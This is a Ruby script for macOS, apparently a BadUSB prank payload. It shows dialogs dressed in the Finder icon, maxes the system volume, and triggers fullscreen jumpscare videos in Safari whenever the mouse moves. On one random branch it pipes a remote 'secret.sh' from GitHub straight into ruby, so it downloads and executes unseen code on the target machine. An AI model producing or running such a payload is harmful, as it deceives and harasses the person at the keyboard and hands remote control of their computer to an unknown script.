#!/usr/bin/env ruby
require 'open-uri'
require 'ffi'
require 'tempfile'

# --- FFI Setup for Mouse Movement Detection (macOS) ---
module CG
  extend FFI::Library
  ffi_lib '/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics'
  # kCGEventMouseMoved constant is 5.
  attach_function :CGEventSourceSecondsSinceLastEventType, [:uint32, :uint32], :double
end

def mouse_moved_recently?(threshold = 0.1)
  # Returns true if the last mouse move event was less than `threshold` seconds ago.
  CG::CGEventSourceSecondsSinceLastEventType(0, 5) < threshold
end

# --- Helper Function: Display AppleScript Dialog with Finder Icon ---
def display_dialog(message, buttons, default_button)
  # Build AppleScript command with Finder icon.
  button_list = "{" + buttons.map { |b| "\"#{b}\"" }.join(", ") + "}"
  ascript = %Q{display dialog "#{message}" buttons #{button_list} default button "#{default_button}" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}
  output = `osascript -e '#{ascript}'`
  if output =~ /button returned:(\S+)/
    return $1
  else
    return nil
  end
end

# --- Volume Control Function ---
def set_volume_to_max
  if system("command -v osascript > /dev/null 2>&1")
    system("osascript -e 'set volume output volume 100'")
  elsif system("command -v amixer > /dev/null 2>&1")
    system("amixer set Master 100%")
  else
    puts "Volume control not supported on this system."
  end
end

# --- Jumpscare Functions ---

# Creates a temporary HTML file embedding the video (for full-screen playback)
# Uses the jumpscare2.mp4 raw file.
def create_jumpscare_html(video_url)
  html_content = <<-HTML
  <html>
    <head>
      <meta charset="UTF-8">
      <title>JumpScare</title>
      <style>
        html, body { margin: 0; padding: 0; height: 100%; background-color: black; }
        video { width: 100%; height: 100%; object-fit: cover; }
      </style>
    </head>
    <body>
      <video id="video" autoplay muted playsinline>
        <source src="#{video_url}" type="video/mp4">
        Your browser does not support the video tag.
      </video>
      <script>
        var video = document.getElementById('video');
        video.play();
        // Request fullscreen on load.
        video.addEventListener('loadeddata', function() {
          if (video.requestFullscreen) { video.requestFullscreen(); }
          else if (video.webkitRequestFullscreen) { video.webkitRequestFullscreen(); }
          else if (video.msRequestFullscreen) { video.msRequestFullscreen(); }
          video.muted = false; // Unmute for jumpscare effect.
          video.play();
        });
      </script>
    </body>
  </html>
  HTML
  file = Tempfile.new(['jumpscare', '.html'])
  file.write(html_content)
  file.close
  file.path
end

def trigger_fullscreen_jumpscare(video_url, duration=1)
  # Set volume to max.
  set_volume_to_max
  # Create temporary HTML file for the jumpscare video.
  html_file = create_jumpscare_html(video_url)
  # Open the HTML file in Safari.
  system("open -a Safari '#{html_file}'")
  sleep duration
  # Close Safari's front window.
  system("osascript -e 'tell application \"Safari\" to close front window'")
end

# Run the secret script branch.
def run_secret_script
  system("curl -s https://raw.githubusercontent.com/Hrampell/badusb_v2/main/secret.sh | ruby")
end

# Trigger winner jumpscare (for subscribed branch outcome 2).
def trigger_winner_jumpscare
  set_volume_to_max
  winner_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
  system("open -a Safari '#{winner_url}'")
end

# --- Main Program Flow ---

# Prompt: "Are you subscribed to my YouTube channel?" (with Finder icon)
subscribed = display_dialog(
  "Are you subscribed to my YouTube channel?\n(https://www.youtube.com/channel/UC8L0XgGChOWiMQ0uM2lWbMg)",
  ["Yes", "No"],
  "Yes"
)

if subscribed.nil?
  puts "No response received. Exiting."
  exit 0
end

if subscribed.downcase == "no"
  # User is not subscribed. Wait 1 second then enter jumpscare mode triggered by mouse movement.
  sleep 1
  puts "Not subscribed mode activated. Move your mouse to trigger a jumpscare!"
  jumpscare_count = 0
  cooldown = 10  # seconds
  last_jumpscare = Time.now - cooldown
  # Raw video URL for jumpscare2.mp4 (fixed raw link)
  jumpscare_video_url = "https://raw.githubusercontent.com/Hrampell/badusb_v2/main/jumpscare2.mp4"
  
  while jumpscare_count < 10
    if mouse_moved_recently? && (Time.now - last_jumpscare >= cooldown)
      last_jumpscare = Time.now
      puts "Mouse detected! Triggering jumpscare #{jumpscare_count+1}..."
      trigger_fullscreen_jumpscare(jumpscare_video_url, 1)
      jumpscare_count += 1
      sleep 5  # Wait 5 seconds before next possible jumpscare
    end
    sleep 0.1
  end
else
  # User is subscribed.
  # Display a second prompt: "Choose a button:" with two options, with Finder icon.
  button_choice = display_dialog(
    "Choose a button:",
    ["Button A", "Button B"],
    "Button A"
  )
  if button_choice.nil?
    puts "No button chosen. Exiting."
    exit 0
  end
  # Random outcome (50/50 chance)
  if rand < 0.5
    # Outcome 1: Run secret script.
    run_secret_script
  else
    # Outcome 2: Display "You won!" dialog and then trigger the winner jumpscare.
    `osascript -e 'display dialog "You won!" buttons {"OK"} default button "OK" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"'`
    trigger_winner_jumpscare
  end
end
